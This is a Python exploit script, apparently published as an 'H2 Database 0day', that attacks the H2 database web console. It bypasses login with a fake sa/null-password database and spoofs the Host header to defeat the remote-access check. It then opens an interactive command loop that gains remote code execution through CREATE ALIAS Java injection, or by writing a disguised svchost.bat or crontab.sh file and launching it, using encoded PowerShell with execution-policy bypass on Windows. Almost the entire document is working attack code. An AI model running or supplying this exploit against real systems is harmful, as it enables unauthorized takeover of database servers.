"""
    H2 Database 0day - ViperX Labs
    Date: 17/07/2024

    The exploit works with the following logic: 
    ~for versions <(1.4) we create a 'dummy' table, and write the output into a C:\Windows\Tasks\svchost.bat file
      '-> With this bat file we can perform remote code execution with Arbitrary File Writing vulnerability.
      '-> for old versions we open the .bat file with "org.h2.util.StartBrowser.openURL" and for the newest one "org.h2.tools.Server.openBrowser"
    ~ In case of versions >(1.4), we just perform JAVA code inject through 'CREATE ALIAS' function:
      '->  
        CREATE FORCE ALIAS CMD_INJECT AS $$
        void pwshInject() throws Exception {
            Runtime.getRuntime().exec("%s");
        }
        $$;
"""
import requests
import re
import sys
TARGET_URL = "http://127.0.0.1:8082"
FAKEDB_SA_NULL_PASSWORD = "jdbc:h2:~/test" # CHANGE HERE (default database ~/test)
PLATFORM = "windows"
if PLATFORM.lower() == "windows":
    OUTPUT_DIRECTORY = "C:/Windows/Tasks"
    BAT_FULLPATH = "C:/Windows/Tasks/svchost.bat"
elif PLATFORM.lower() == "linux" or PLATFORM.lower() == "macos":
    OUTPUT_DIRECTORY = "/dev/shm/"
    SH_FULLPATH = "/dev/shm/crontab.sh"
#COMMAND = "cmd.exe /C calc.exe"
#COMMAND = "echo blabla > /dev/shm/o.txt"
#################################################################################
# 1st Stage - Auth Bypass - Generate and use a fake Database with sa:<null> credentials
#    '-> Validade attacker [JESSIONID] token as a valid session
url_auth_bypass = f"{TARGET_URL}/login.do"
headers_auth_bypass = {
    "Cache-Control": "max-age=0",
    "Host": "127.0.0.1",
    "Upgrade-Insecure-Requests": "1",
    "Origin": f"{TARGET_URL}",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Referer": f"{TARGET_URL}/login.do",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
    "Connection": "keep-alive"
}
# 1 - Generate JSESSIONID token
r = requests.get(url_auth_bypass, headers=headers_auth_bypass, verify=False)
#print(r.text)
JSESSIONID = re.findall(r"login.jsp\?jsessionid=(.*?)\';", r.text)[0]
data_auth_bypass = {
    "language": "en",
    "setting": "Generic H2 (Server)",
    "name": "Generic H2 (Server)",
    "driver": "org.h2.Driver",
    "url": f"{FAKEDB_SA_NULL_PASSWORD}",
    "user": "sa",
    "password": ''
}
# 2 - Validade JSESSIONID token as a valid session
url_auth_bypass = f"{TARGET_URL}/login.do?jsessionid={JSESSIONID}"
r = requests.post(url_auth_bypass, headers=headers_auth_bypass, data=data_auth_bypass, verify=False)
#print(r.text)
err1 = "not found, either pre-create it or allow remote database creation (not recommended in secure environments)"
err2 = "is larger than the supported format"
if err1 in r.text or err2 in r.text:
    print(str(r.text))
    print(f"\n\t[-] Could not get access to {FAKEDB_SA_NULL_PASSWORD} database!")
    print(f"\t[!] Just change JDBC URL for another one!")
    sys.exit(0)
#################################################################################
# 2st Stage - Execute [0day.exe]
url_CMD_Query = f"{TARGET_URL}/query.do?jsessionid={JSESSIONID}"
headers_CMD_Query = {
    "Cache-Control": "max-age=0",
    "Upgrade-Insecure-Requests": "1",
    "Host": "127.0.0.1", # Bypass allowRemoteAccess Check
    "Origin": f"{TARGET_URL}",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Referer": f"{TARGET_URL}/query.jsp?jsessionid={JSESSIONID}",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7",
    "Connection": "keep-alive"
}
while True:
    # shell execve
    COMMAND = input("COMMAND> ")
    import base64
    # Encode the command in UTF-16LE
    command_bytes = COMMAND.encode('utf-16le')
    # Convert the bytes to a Base64 string
    base64_command = base64.b64encode(command_bytes).decode('ascii')

    # >=1.4? - Server.openBrowser -> Newer versions from H2 Database
    # <=1.4? - StartBrowser.openURL -> Old versions
    if PLATFORM.lower() == "windows":
        SQL_old_ver_query = f"""-- H2 Database OLD versions RCE [1.1.101 ~ 1.4?] (https://code.google.com/archive/p/h2database/downloads?page=5)
-- 1st phase - Arbitrary File Upload
-- Drop the alias if it exists
DROP ALIAS IF EXISTS PWSH_INJECT;

-- RCE - 0day.bat Payload with custom command 
CREATE FORCE ALIAS PWSH_INJECT FOR "a.
powershell -nop -ep bypass -enc {base64_command}
";
SCRIPT SIMPLE NODATA NOSETTINGS TO '{BAT_FULLPATH}';

-- 2nd phase - Arbitrary Execution
-- Create the alias for the StartBrowser function
CREATE TABLE EXPLOIT(
    ID INT PRIMARY KEY, 
    NAME VARCHAR(255)
);

-- Insert values into the table
INSERT INTO EXPLOIT (ID, NAME) VALUES (1, 'file://{BAT_FULLPATH}');

-- Bruteforce for the correct vulnerable class
-- * org.h2.util.StartBrowser.openURL <1.4?
-- * org.h2.tools.Server.openBrowser

CREATE FORCE ALIAS OPEN_URL FOR "org.h2.util.StartBrowser.openURL";
CALL OPEN_URL(SELECT NAME FROM EXPLOIT);

CREATE FORCE ALIAS OPEN_BROWSER FOR "org.h2.tools.Server.openBrowser";
CALL OPEN_BROWSER(SELECT NAME FROM EXPLOIT);

-- Drop table exploit table
DROP TABLE EXPLOIT;
"""
    elif PLATFORM == "linux" or PLATFORM == "macos":
        SQL_old_ver_query = (f"""-- Create the alias for the StartBrowser function
-- H2 Database OLD versions RCE [1.1.101 ~ 1.4?] (https://code.google.com/archive/p/h2database/downloads?page=5)
-- 1st phase - Arbitrary File Upload
-- Drop the alias if it exists
DROP ALIAS IF EXISTS PWSH_INJECT;
-- RCE - 0day.bat Payload with custom command
CREATE FORCE ALIAS PWSH_INJECT FOR "a.
{COMMAND}
";
SCRIPT SIMPLE NODATA NOSETTINGS TO '{SH_FULLPATH}';
-- 2nd phase - Arbitrary Execution
-- Create the alias for the StartBrowser function
CREATE TABLE EXPLOIT(
    ID INT PRIMARY KEY,
    NAME VARCHAR(255)
);
-- Insert values into the table
INSERT INTO EXPLOIT (ID, NAME) VALUES (1, 'file://{SH_FULLPATH}');
-- Bruteforce for the correct vulnerable class
-- * org.h2.util.StartBrowser.openURL <1.4?
-- * org.h2.tools.Server.openBrowser
CREATE FORCE ALIAS OPEN_URL FOR "org.h2.util.StartBrowser.openURL";
CALL OPEN_URL(SELECT NAME FROM EXPLOIT);
CREATE FORCE ALIAS OPEN_BROWSER FOR "org.h2.tools.Server.openBrowser";
CALL OPEN_BROWSER(SELECT NAME FROM EXPLOIT);
-- Drop table exploit table
DROP TABLE EXPLOIT;
""")
    SQL_new_ver_query = ("""-- H2 Database NEW versions RCE >=1.4?
-- Drop the alias if it exists
DROP ALIAS IF EXISTS CMD_INJECT ;
-- Create the alias with the command
CREATE FORCE ALIAS CMD_INJECT AS $$
void pwshInject() throws Exception {
    Runtime.getRuntime().exec("%s");
}
$$;
-- Execute the alias to run the command
CALL CMD_INJECT();
""" % COMMAND)
    data_CMD_Query = {
        "sql": SQL_old_ver_query + SQL_new_ver_query # bruteforce OLD + NEW versions
    }
    #print(data_CMD_Query["sql"])
    r = requests.post(url_CMD_Query, headers=headers_CMD_Query, data=data_CMD_Query)
    #print(r.text)
